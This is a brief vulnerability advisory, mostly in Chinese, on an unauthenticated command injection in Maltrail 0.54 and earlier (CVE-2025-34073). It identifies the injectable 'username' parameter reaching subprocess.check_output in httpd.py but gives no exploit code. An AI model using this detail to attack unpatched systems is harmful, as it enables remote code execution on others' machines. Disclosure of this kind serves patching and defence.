Maltrail Unauthenticated Command Injection

漏洞信息

漏洞名称： Maltrail Unauthenticated Command Injection

漏洞编号：

  • CVE： 2025-34073

漏洞类型： 命令执行

漏洞等级： 高危

漏洞描述： Maltrail是一个恶意流量检测系统，利用公开可用的黑名单来检测恶意或可疑的流量。该系统广泛应用于网络安全领域，用于监控和分析网络流量以识别潜在的安全威胁。在Maltrail版本0.54及更早版本中，存在一个命令注入漏洞。该漏洞位于mailtrail/core/httpd.py文件中的subprocess.check_output函数，具体是在params.get("username")参数中。攻击者可以通过在username参数中注入任意操作系统命令来利用此漏洞。注入的命令将以运行进程的权限执行。此漏洞可以远程利用，且无需身份验证。成功利用此漏洞可能导致远程代码执行，进而可能完全控制受影响的系统。由于Maltrail通常部署在网络的关键位置，此漏洞的利用可能导致严重的安全事件，包括数据泄露和服务中断。

产品厂商： Maltrail

产品名称： Maltrail

影响版本： version <= 0.54
